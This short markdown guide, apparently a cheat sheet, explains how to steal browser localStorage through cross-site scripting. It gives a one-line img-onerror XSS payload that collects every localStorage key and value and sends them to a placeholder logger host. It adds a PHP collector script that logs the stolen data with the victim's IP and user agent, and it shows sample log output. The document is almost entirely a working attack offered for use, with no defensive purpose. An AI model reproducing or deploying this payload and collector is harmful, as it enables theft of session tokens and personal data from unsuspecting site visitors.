# Simple Steps - Log LocalStorage (XSS + PHP)

## One-Line Payload (HTML)

```html
<img src=x onerror="let d=[];for(let i=0;i<localStorage.length;i++){d.push(localStorage.key(i)+'='+localStorage.getItem(localStorage.key(i)));}new Image().src='http://your-logger-site.com/logger.php?localstorage='+encodeURIComponent(d.join(';'))">
```

---

## PHP Logger (`logger.php`)

```php
<?php
$log = "[" . date("Y-m-d H:i:s") . "] ";
$log .= "IP: {$_SERVER['REMOTE_ADDR']} | ";
$log .= "LocalStorage: " . ($_GET['localstorage'] ?? 'None') . " | ";
$log .= "User-Agent: {$_SERVER['HTTP_USER_AGENT']}" . PHP_EOL;

file_put_contents('localstorage.log', $log, FILE_APPEND);
```

---

## Example Output (`localstorage.log`)

```
[2025-03-05 16:45:00] IP: 192.168.1.10 | LocalStorage: theme=dark;userID=12345 | User-Agent: Mozilla/5.0
```
